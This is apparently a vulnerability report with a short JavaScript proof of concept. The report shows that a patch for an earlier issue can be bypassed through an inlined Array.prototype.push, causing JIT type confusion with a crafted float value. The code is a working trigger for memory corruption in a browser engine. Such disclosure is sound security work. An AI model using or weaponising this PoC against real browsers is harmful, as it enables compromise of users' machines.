/*
This is similar to  issue 1531 . The patch seems to prevent type confusion triggered from StElemI_A instructions. But the SetItem method can also be invoked through the Array.prototype.push method which can be inlineed. We can achieve type confusion with the push method in the same way used for  issue 1531 .

PoC:
*/

function opt(arr, value) {
	arr.push(value);  // <--------
	arr[0] = 2.3023e-320;
}

function main() {
    for (let i = 0; i < 0x10000; i++) {
		let tmp = [1.1, 2.2, 3.3];
		delete tmp[1];

        opt(tmp, 2.2);
    }

    let arr = [1.1];
    opt(arr, -5.3049894784e-314);  // MAGIC VALUE!

    alert(arr);
}

main();